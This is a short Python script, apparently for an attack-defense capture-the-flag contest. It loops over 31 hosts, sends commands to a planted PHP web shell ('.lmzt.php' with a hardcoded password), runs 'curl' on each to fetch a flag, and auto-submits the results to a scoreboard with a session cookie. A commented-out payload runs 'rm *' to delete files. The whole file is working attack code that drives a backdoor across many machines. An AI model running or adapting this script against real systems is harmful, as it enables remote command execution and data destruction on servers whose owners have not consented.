import requests
import json

url = "http://4.4.%d.100/.lmzt.php?passwd=lmzt66"
cookie = {'PHPSESSID':'cbenv5ev7se3icaueq6mhjgpm7'}
data = {
	'a':"system(\"curl 192.168.100.1/getkey\");"
}

#data = {'a':"system(\"rm *\");"}
submit_flag = "http://192.168.100.1/Title/TitleView/savecomprecord"

j = 0
for i in range(1,32):
	now_url = url%i
	#print(now_url)
	try:
		r = requests.post(now_url,data=data,timeout=3)
		if 'key' in r.text:
			flag = r.text
			print(r.text)
			ans = {'answer':flag}
			j += 1
			print(j)
			r = requests.post(submit_flag,data=ans,cookies=cookie)

			print(json.loads(r.text))
	except:
		pass
	